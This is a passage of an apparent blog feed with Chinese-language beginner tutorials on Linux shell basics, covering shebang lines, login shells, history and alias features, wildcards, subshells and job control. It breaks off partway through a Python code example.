        <content type="html"><![CDATA[<h1 id="shell">Shell</h1><h2 id="简介">简介</h2><p>Shell 是一个用 C 语言编写的程序，它是用户使用 Linux 的桥梁。Shell既是一种命令语言，又是一种程序设计语言。</p><p>Shell是指一种应用程序，这个应用程序提供了一个界面，用户通过这个界面访问操作系统内核的服务。</p><p>Ken Thompson 的 sh 是第一种 Unix Shell，Windows Explorer是一个典型的图形界面 Shell。</p><p>单独地学习 Shell 是没有意义的，Shell需要依赖其他程序才能完成大部分的工作，这或许是它的缺陷，但它不容置疑的长处是：简洁的脚本语言标记方式，而且比C 语言编写的程序执行更快、更有效率。</p><p>换句话说，Shell基本没有语法难度，但是它更多用的是对应工具的管理命令。比如：写个 LAMP安装脚本，你重点需要熟悉是 LAMP 的工具管理命令，而不是简单地 shell语言。</p><p>目前主要学习 shell的基础和简单应用，后面学习了足够的管理工具，再深入应用。</p><p>图形界面和命令行要达到的目的是一样的，都是让用户控制计算机。</p><p>Shell 除了能解释用户输入的命令，将它传递给内核，还可以： 1.调用其他程序，给其他程序传递数据或参数，并获取程序的处理结果； 2.在多个程序之间传递数据，把一个程序的输出作为另一个程序的输入； 3. Shell本身也可以被其他程序调用。</p><p>由此可见，Shell 是将内核、程序和用户连接了起来。</p><h3 id="shell-能做什么">Shell 能做什么</h3><ol type="1"><li><p>自动化系统初始化(Update， 软件源配置、更新、时区设置、安全策略)当我们装完系统之后，我们需要对系统的时区、软件包的源、软件更新、安全设置等进行一些初始化</p><p>我怎么没想到呢 emm，早知道早点学 shell了，苦了我重装了那么多次系统。</p><ul class="task-list"><li><label><input type="checkbox" />写一个 manjaro 装机后自动化配置脚本顺便写上写一个 manjaro 必备软件安装脚本</label></li></ul></li><li><p>自动化批量软件部署程序（LAMP/LNMP/Tomcat/LVS/Nginx）</p></li><li><p>自动化管理程序（例如：KVM-manager管理、集群管理扩容、MySQL，DELLR720 批量管理 RAID）</p></li><li><p>日志分析处理程序（网站统计数据 PV、UV 处理过滤,如：top 100等，常用 grep/awk）</p></li><li><p>自动化备份恢复程序（MySQL 完全备份/增量备份 + Crond）</p><ul class="task-list"><li><label><input type="checkbox" />自动化定期执行 Crond学习</label></li></ul></li><li><p>自动化管理程序(批量远程修改密码、软件升级、配置更新)</p></li><li><p>自动化信息采集及监控程序（收集系统/应用程序状态、CPU、Mem、Disk、Net、TCPStatus、Apache、MySQL）</p></li><li><p>配合 Zabbix信息采集（收集系统/应用状态信息，CPU、Mem、Disk、Net、TCPStatus、Apache、MySQL）</p></li><li><p>自动化扩容（根据峰值访问动态调整云主机个数 --&gt; 业务上线）Zabbix 监控 CPU 80% -&gt; 预处理： 通过亚马逊、阿里云等提供的 Python API调用增加（删除） AWS/EC2 等云主机 -&gt; ShellScript(对新增的云主机进行业务上线)</p></li><li><p>俄罗斯方块、打印三角形、打印圣诞树、打印五角星、运行小火车、坦克、排序算法</p></li><li><p>Shell 理论上可以做任何事情（一切取决于业务需求）当然，实际应用中，如果一个功能太过于复杂，也不建议使用 shell， 可以使用Python，Go 等</p></li></ol><h2 id="语法规范">语法规范</h2><ol type="1"><li><p>shell 脚本的后缀一般为 <code>.sh</code></p></li><li><p>命令正常执行返回值为 0，返回值为 <code>?</code> 变量，我们可以用<code>$?</code> 来获取它的值</p></li><li><p>分号<code>;</code> 作为不同命令的分隔</p></li><li><p><code>&amp;&amp;</code> 和 <code>||</code>的短路作用，可以进行逻辑判断，达到 if 判断真假的作用，比如：<code>ping -c 1 www.baidu.com &amp;&gt;/dev/null &amp;&amp; echo "www.baidu.com is up" || echo "www.baidu.com is down"</code></p></li></ol><h2 id="python-shell-执行方式对比">Python Shell 执行方式对比</h2><h3 id="程序">程序</h3><p>著名的瑞士计算机科学家、PASCAL 语言发明者 N·沃思（NiklausWirth）教授提出程序定义的著名公式：<strong>程序=算法+数据结构</strong>以上公式说明了如下两个问题： （1）算法决定如何构造和组织数据（算法 →数据结构）。 （2）算法的选择依赖于作为基础的数据结构（数据结构 →算法）。</p><p>算法是数据操作，数据结构是数据的描述</p><h3 id="简单对比">简单对比</h3><ol type="1"><li><p>Shell 解释性脚本，可以直接在 shell 中以交互模式运行 当然，shell有多种（而且都有些差异），但一般就指 <code>bash</code></p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /etc/shells</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Pathnames of valid login shells.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">See shells(5) <span class="keyword">for</span> details.</span></span><br><span class="line"></span><br><span class="line">/bin/sh</span><br><span class="line">/bin/bash</span><br><span class="line">/bin/zsh</span><br><span class="line">/usr/bin/zsh</span><br><span class="line">/usr/bin/git-shell</span><br><span class="line"></span><br></pre></td></tr></table></figure></p></li><li><p>Python</p><ol type="1"><li>解释 Python是一个高层次的结合了解释性、编译性、互动性和面向对象的脚本语言。</li><li>编译 Python 源码 --&gt; Python 的 byte code（.pyc 格式） --&gt;Python Virtual Machine 执行 和 Java 或 .NET 相比，Python 的 VirtualMachine 距离真实机器的距离更远。或者可以说 Python 的 Virtual Machine是一种抽象层次更高的 Virtual Machine。基于 C 的 Python编译出的字节码文件，通常是.pyc 格式</li></ol></li><li><p>一个有趣的现象：在 Java写好网站之后，每个功能点第一次点击都比较慢，因为第一次点击的时候需要将其编译成字节码，以后就快了</p></li></ol><h2 id="shebang">shebang</h2><ol type="1"><li>通过 <code>$!</code> 开始一个脚本， It is called a shebang or a"bang" line. <code>#!</code>后面跟着解释器的绝对路径，例如：<code>#!/usr/bin/bash</code></li><li>shebang只能第一行，也只有放在第一个行有效,放在非第一行，那就只是注释了。</li><li>Linux 上所有的脚本执行都会使用第一行的 shebang 指定的解释器。</li><li>这确保即使即使脚本在其他 shell 在中执行时候，也会使用 shebang指定的解释器 常见的 shebang： <code>#!/bin/bash</code>、<code>#!/usr/bin/perl</code>、 <code>#!/usr/bin/python</code>、<code>#!/usr/bin/python3</code>、 <code>#!/usr/bin/env bas</code></li><li>显式指定解释器时，则使用显式的，不显示指定，默认使用 shebang指定的。 隐式执行 shell 脚本，不写 shebang，影响不太大，而 python之类脚本的，在 shell 中隐式执行，，如果没有 shebang 的话，则会使用bash/shell 作为解释器。 不同类型脚本，在 shebang中指定对应的解释器。</li></ol><p>推荐写法：</p><blockquote><p>You should use <code>#!/usr/bin/env bash</code> for <ahref="https://en.wikipedia.org/w/index.php?title=Shebang_(Unix)&amp;oldid=878552871#Portability">portability</a>:different *nixes put <code>bash</code> in different places, andusing <code>/usr/bin/env</code> is a workaround to run thefirst <code>bash</code> found on the <code>PATH</code>. And <ahref="https://mywiki.wooledge.org/BashGuide/CommandsAndArguments#Scripts"><code>sh</code> isnot <code>bash</code></a>.</p></blockquote><p>通过 <code>which</code> 可以查看解释器的路径，此外，我们还可以看到<code>sh</code> 其实是指向 <code>bash</code> 的一个软链接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [13:58:37]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">which</span> python</span></span><br><span class="line">/usr/bin/python</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [13:58:44]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">which</span> sh</span></span><br><span class="line">/usr/bin/sh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [13:58:49]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">which</span> bash</span></span><br><span class="line">/usr/bin/bash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll /usr/bin/bash</span></span><br><span class="line">-rwxr-xr-x 1 root root 907K  5月 27 03:32 /usr/bin/bash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [13:03:03]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll /usr/bin/sh</span></span><br><span class="line">lrwxrwxrwx 1 root root 4  5月 27 03:32 /usr/bin/sh -&gt; bash</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="扩展阅读">扩展阅读</h2><p><ahref="https://www.zhihu.com/question/20448467">如何清楚易懂的解释“UV 和PV＂的定义？</a></p><h2 id="参考资料">参考资料</h2><p><a href="https://www.bilibili.com/video/BV19t411s7Jx">Linux Shell脚本自动化编程实战（完整版）</a></p><p><ahref="https://stackoverflow.com/questions/10376206/what-is-the-preferred-bash-shebang">Whatis the preferred Bash shebang?</a></p><p><a href="https://bash.cyberciti.biz/guide/Shebang">Shebang</a></p><p><ahref="https://baike.baidu.com/item/Python/407313?fr=aladdin#7">Python</a></p>]]></content>
      
      
      <categories>
          
          <category> shell </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>shell 一些特性</title>
      <link href="/blog/2020/07/13/programming/shell/1.shell_feature/"/>
      <url>/blog/2020/07/13/programming/shell/1.shell_feature/</url>
      
        <content type="html"><![CDATA[<h2 id="login-nologin-shell">login &amp; nologin shell</h2><h3 id="系统级">系统级</h3><p>这两个 <code>/etc/profile</code> 、 <code>/etc/.bashrc</code> 是进入shell 时，执行的</p><h3 id="用户级">用户级</h3><p>这两个是登录 shell 时执行的：</p><p><code>~/.bash_profile</code> <code>~/.bashrc</code></p><p>这两个是离开 shell 时执行：</p><p><code>~/.bash_logout</code> <code>~/.bash_history</code> ， 其中<code>history</code> 命令是实时更新的，本次 shell的命令历史存在缓存里面，在退出 shell 时才会写入到<code>~/.bash_history</code> 。（注意：如果使用 zsh 的话，则为<code>~/.zsh_history</code> ）</p><h3 id="login-shell">login shell</h3><p>使用 <code>su - violetu</code> 切换（注意：有 <code>-</code>），切换/登录 login shell 会执行这四个 <code>/etc/profile</code> 、<code>/etc/.bashrc</code> 、 <code>~/.bash_profile</code> 、<code>~/.bashrc</code> ，离开时，</p><h3 id="nologin-shell">nologin shell</h3><p>使用 <code>su violetu</code> 切换， 切换/登录 nologinshell，只会执行这两个： <code>/etc/.bashrc</code> 、<code>~/.bashrc</code> 。</p><h2 id="shell-查看与更改">shell 查看与更改</h2><ol type="1"><li><p>查看当前正在使用的 shell</p><ol type="1"><li><code>echo $SHELL</code></li><li><code>ps</code></li><li><code>echo $0</code></li><li>输入不存在的命令，查看出错的 shell 提示</li></ol></li><li><p>查看系统中安装了哪些 shell <code>cat /etc/shells</code></p></li><li><p>改变当前 shell <code>chsh -s /bin/zsh</code></p></li></ol><h2 id="gnubash-shell-特点">GNU/bash shell 特点</h2><ol type="1"><li><p>Tab 命令自动补齐</p></li><li><p>命令历史记忆功能 上下键、、 <code>!string</code> 、<code>!$</code> 、 <code>!!</code> 、 <code>^R</code></p><p>下面的有些指令，可能在我们人使用时，价值不大，但是它们写 shell脚本时，可以发挥作用。</p><ol type="1"><li><p>上下键</p></li><li><p><code>!number</code> :跟木 number 显示并执行 history中对应第几条的命令</p></li><li><p><code>!stirng</code> , 找到最近一个以 string 开头的命名，例如：<code>！da</code> 找到你最近执行的、以 d a 开头的命令</p></li><li><p><code>!$</code> 引用上一个命令的最后一个参数</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [20:59:39]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> ~/Downloads</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/Downloads [20:59:48]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll !$</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/Downloads [21:00:00]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll ~/Downloads</span></span><br></pre></td></tr></table></figure></p></li><li><p><code>!!</code> 上一个命令</p></li></ol></li><li><p>定义别名</p><ol type="1"><li><p>alias、unalias 临时定义/解除定义临时别名</p></li><li><p><code>~/.bashrc</code> 、 <code>~/.zshrc</code>定义永久的别名</p></li><li><p><code>\命令</code> 不使用该命令的别名</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [21:19:07]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">alias</span> <span class="built_in">cd</span>=<span class="string">&quot;echo this is cd temp alias&quot;</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [21:19:23]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span></span></span><br><span class="line">this is cd temp alias</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [21:19:24]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">\<span class="built_in">cd</span> ~/Downloads</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/Downloads [21:19:32]</span></span><br><span class="line"><span class="meta prompt_">$</span></span><br></pre></td></tr></table></figure></p></li></ol></li><li><p>快捷键</p><p>详细见：<ahref="https://linuxtoy.org/archives/bash-shortcuts.html">让你提升命令行效率的Bash 快捷键 [完整版]</a> 常用： Ctrl + a ：移到命令行首 Ctrl + e：移到命令行尾 Alt + f ：按单词前移（右向） Alt + b ：按单词后移（左向）Ctrl + w ：从光标处删除至字首 Alt + d ：从光标处删除至字尾 Ctrl +r：逆向搜索命令历史 Ctrl + l：清屏 Ctrl + c：终止命令 Ctrl + z：挂起命令Ctrl + s：阻止屏幕输出(zsh 不适用) Ctrl + q：允许屏幕输出 Ctrl+d:(Terminate input, or exit shell) 一个特殊的二进制值，表示EOF，作用相当于在终端中输入 exit 后回车；</p></li></ol><h2 id="元字符通配符">元字符(通配符)</h2><ul><li><p><code>*</code> 匹配任意多个字符<code>ls ln*</code>、<code>rm -rf *</code>、<code>rm -rf *.pdf</code>、<code>find / -iname "*-eth0"</code></p></li><li><p><code>?</code> 匹配任意一个字符</p></li><li><p><code>[]</code> 匹配括号中的<strong>任意一个</strong>字符<code>[abc] [a-z] [0-9] [^a-z0-9]</code></p></li><li><p><code>()</code> 在子 shell 中执行命令，不影响当前 shell。例如：改变umask，然后创建文件（只希望它影响创建的那个文件的权限），那就可以在 子shell 中执行命令。 umask 指定默认的文件权限，两种查看方式：</p><p><code>umask</code> 返回的是去除的权限，其中<strong>文件基数为666，目录为 777</strong>， 即：文件夹权限是<code>777</code>-其返回结果，文件权限是 <code>666</code>-其返回结果<code>umask -S</code> 返回文件创建的默认权限的符号化表达。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [8:56:05]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">umask</span></span></span><br><span class="line">022</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [8:56:12]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">umask</span> -S</span></span><br><span class="line">u=rwx,g=rx,o=rx</span><br></pre></td></tr></table></figure></li><li><p><code>&#123;&#125;</code> 集合 逗号：<code>touch test&#123;1,3&#125;</code> 指 test1和 test3 <code>mkdir ~/&#123;111,333&#125;</code> 指在 home 目录下创建 111 和 333目录 两个点：<code>touch test&#123;1..3&#125;</code> 指 test1 和 test3</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [9:02:13]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">touch</span> <span class="built_in">test</span>&#123;1,3&#125;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [9:02:07]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll|grep <span class="string">&quot;test[.]*&quot;</span></span></span><br><span class="line">-rw-r--r-- 1 violetv violetv   0  6月 30 09:01 test1</span><br><span class="line">-rw-r--r-- 1 violetv violetv   0  6月 30 09:01 test3</span><br></pre></td></tr></table></figure><p>复制技巧：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [9:13:56]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cp</span> -rv ~/test/&#123;xx.config,xx.config.old&#125;</span></span><br><span class="line">&#x27;/home/violetv/test/xx.config&#x27; -&gt; &#x27;/home/violetv/test/xx.config.old&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">再简写</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [9:16:19]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cp</span> -rv ~/test/xx.config&#123;,.old&#125;</span></span><br><span class="line">&#x27;/home/violetv/test/xx.config&#x27; -&gt; &#x27;/home/violetv/test/xx.config.old&#x27;</span><br></pre></td></tr></table></figure></li><li><p><code>\</code> 转义字符 以下为转义 <code>*</code> 和转义回车</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [9:17:19]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> \*</span></span><br><span class="line">*</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [9:17:22]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> \</span></span><br><span class="line"><span class="language-bash">&gt; hello</span></span><br><span class="line">hello</span><br></pre></td></tr></table></figure></li></ul><h2 id="参考资料">参考资料</h2><blockquote><ol type="1"><li><ahref="https://unix.stackexchange.com/questions/70963/difference-between-2-2-dev-null-dev-null-and-dev-null-21">Differencebetween 2&gt;&amp;-, 2&gt;/dev/null, |&amp;, &amp;&gt;/dev/null and&gt;/dev/null 2&gt;&amp;1</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> shell </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Subshells</title>
      <link href="/blog/2020/07/13/programming/shell/2.exec_type/"/>
      <url>/blog/2020/07/13/programming/shell/2.exec_type/</url>
      
        <content type="html"><![CDATA[<p>一般情况下，脚本都是在 subshell中执行，但是相信在修改环境变量、别名等，使它生效时，你也用过诸如:<code>source ./bashrc</code> 等，它就是在当前 shell执行的一个应用场景。</p><h2 id="执行方式">执行方式</h2><h2 id="子-shell-中执行">子 shell 中执行</h2><p>当前 shell 是父进程，生成一个子 shell 进程，在子 shell中执行脚本。脚本执行完毕，退出子 shell，回到当前 shell。</p><ol type="1"><li><p>作为解释器参数，明确指定解释器</p><p>shell脚本指定解释器：<code>bash test.sh</code>、<code>sh test.sh</code>， py脚本指定 Python 解释器： <code>bash test.py</code> shell 脚本由 shell解释。如果对于 shell 脚本，你使用 python解释器，<code>python test.sh</code> 那它就会报错。这种方式运行的脚本，不需要用 shebang第一行指定解释器信息，写了也没用。</p></li><li><p>作为可执行程序，直接用路径执行</p><p>通过相对路径或者绝对路径执行，无论是 Shell 还是 Python脚本都需要添加执行权限。<code>chmod +x test.sh</code> 或<code>chmod +x test.py</code> 而在 shell 中执行，它是隐式调用 bash作为解释器的，如果想要通过这种方式来执行除 shell 以外的，如：python。perl expect 之类的脚本，就需要 <code>shebang</code> 了</p><p>注意，一定要写成 <code>./test.sh</code>，而不是<code>test.sh</code>，运行其它二进制的程序也一样，直接写<code>test.sh</code>，linux 系统会去 PATH 里寻找有没有叫<code>test.sh</code> 的，而只有<code>/bin, /sbin, /usr/bin，/usr/sbin</code> 等在 PATH里，你的当前目录通常不在 PATH 里，所以写成 <code>test.sh</code>是会找不到命令的，要用 <code>./test.sh</code>告诉系统说，就在当前目录找。</p></li></ol><h2 id="当前-shell-执行">当前 shell 执行</h2><p>在当前上下文中执行脚本，不会生成新的进程。脚本执行完毕，回到当前shell。</p><p>脚本中的命令影响到当前 shell，比如下面的例子，当前工作目录受脚本的<code>cd</code> 影响，切换到了上一级。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [13:38:47]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> test_subshell.sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/usr/bin/bash</span></span><br><span class="line">ls</span><br><span class="line">cd ../</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [13:46:25]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">source</span> test_subshell.sh</span></span><br><span class="line">1.py  ip.txt  ping_1.sh  ping_condition.sh  ping_ipfile.sh  ping_sh.sh  test  test_subshell.sh  test.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [13:46:41]</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">中输入<span class="built_in">exit</span>后回车；</span></span><br></pre></td></tr></table></figure><ol type="1"><li><p>点空格 <code>. ./script.sh</code></p></li><li><p>source <code>source script.sh</code></p></li></ol><h2 id="exec">exec</h2><p>使用 exec command 方式，会用 command 进程替换当前 shell进程，并且保持 PID 不变。执行完毕，直接退出，不回到之前的 shell环境。</p><h2 id="参考资料">参考资料</h2><p><a href="https://bash.cyberciti.biz/guide/What_is_a_Subshell%3F">Whatis a Subshell?</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell 前后台作业控制 &amp; nohup screen</title>
      <link href="/blog/2020/07/13/programming/shell/fgbg_work/"/>
      <url>/blog/2020/07/13/programming/shell/fgbg_work/</url>
      
        <content type="html"><![CDATA[<h2 id="简介">简介</h2><p>在 Linux 执行任务时，如果键入 Ctrl+C 退出进行其他任务或者关闭当前session 当前任务就会终止要想不让进程停止或者让进程在后台运行，就需要一些命令：<code>&amp;, nohup, screen</code></p><h2 id="任务控制">任务控制</h2><p>注意：作业控制机制是 shell 的功能，终端关了，就没有这个机制了。</p><p>fg、bg、jobs、&amp;、ctrl + z都是跟系统任务有关的，虽然现在基本上不怎么需要用到这些命令，但学会了也是很实用的</p><ol type="1"><li><p><code>&amp;</code> 命令放到后台执行</p></li><li><p><code>ctrl+z</code> 将一个正在前台执行的命令后台挂起</p></li><li><p><code>jobs</code> 查看当前有多少在后台运行的命令</p></li><li><p><code>fg</code> 将后台中的命令调至前台继续运行</p><p>如果后台中有多个命令，可以用  <code>fg %jobnumbe</code>r将选中的命令调出，<code>%jobnumber</code> 是通过 <code>jobs</code>命令查到的后台正在执行的命令的序号(不是 pid)</p></li><li><p><code>bg</code> 将一个在后台暂停的命令，变成继续执行</p><p>如果后台中有多个命令，可以用 <code>bg %jobnumber</code>将选中的命令调出，<code>%jobnumber</code> 是通过 <code>jobs</code>命令查到的后台正在执行的命令的序号(不是 pid)</p></li></ol><h3 id="进程任务控制">进程任务控制</h3><p>下列命令可以用来操纵进程任务：</p><ol type="1"><li><p><code>ps</code>  列出系统中正在运行的进程；</p></li><li><p><code>kill</code> 发送信号给一个或多个进程（经常用来杀死一个进程）；</p></li><li><p><code>jobs</code>  列出当前 shell环境中已启动的任务状态，若未指定jobsid，则显示所有活动的任务状态信息；如果报告了一个任务的终止(即任务的状态被标记为Terminated)，shell  从当前的 shell 环境已知的列表中删除任务的进程标识；fg  将进程搬到前台运行（Foreground），bg 将进程搬到后台运行（Background）；</p><p>如果后台的任务号有 2个，[1],[2]；如果当第一个后台任务顺利执行完毕，第二个后台任务还在执行中时，当前任务便会自动变成后台任务号码"[2]"的后台任务。所以可以得出一点，即当前任务是会变动的。当用户输入"fg"、"bg" 和 "stop"等命令时，如果不加任何引号，则所变动的均是当前任务。</p><p>使用 jobs 或 ps 命令可以查看正在执行的 jobs。</p><p>jobs命令执行的结果，比如：<code>[1] + 6310 suspended python test.py &lt; loop_num.txt &gt; result.txt</code></p><p>＋表示是一个当前的作业，减号表示是一个当前作业之后的一个作业，<code>jobs -l</code>选项可显示所有任务的 PID, jobs 的状态可以是 suspended， running，continued， done, 但是如果任务被终止了（kill），shell  从当前的 shell环境已知的列表中删除任务的进程标识；也就是说，jobs 命令显示的是当前shell 环境中所起的后台正在运行或者被挂起的任务信息；</p></li><li><p>进程的挂起</p><p>后台进程的挂起：</p><p><code>kill -SIGTSTP PID</code></p><p>通过 stop 命令执行，通过 jobs 命令查看 job 号(假设为 num)，然后执行stop %num；</p><p>当要重新执行当前被挂起的任务时，通过 <code>bg %num</code>即可将挂起的 job 的状态由 suspended 改为running，仍在后台执行；当需要改为在前台执行时，执行命令<code>fg %num</code> 即可</p></li></ol><h2 id="后台执行">后台执行</h2><p>当我们希望任务在后台执行，我们可以在命令的最后加上<code>&amp;</code>，然后就可以在前台做别的事情啦。而且这样也不会因为Ctrl+C 发出 <code>SIGINT</code> 信号而终止前台进程啦。我们日常使用的Ctrl+z 也是使程序后台挂起。</p><p>但是要是任务需要从 stdin 读取输入或者向 stdout 输出会怎么样呢？答案是：输出仍然会在前台输出，造成一种错乱的感觉（哈哈），而如果你将需要输入的任务直接放到后台，那它没办法在后台读取输入。</p><h3 id="输出">输出</h3><p>案例： python 脚本循环输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># num = int(input(&quot;请输入循环次数：&quot;))</span></span><br><span class="line">num = <span class="number">4</span></span><br><span 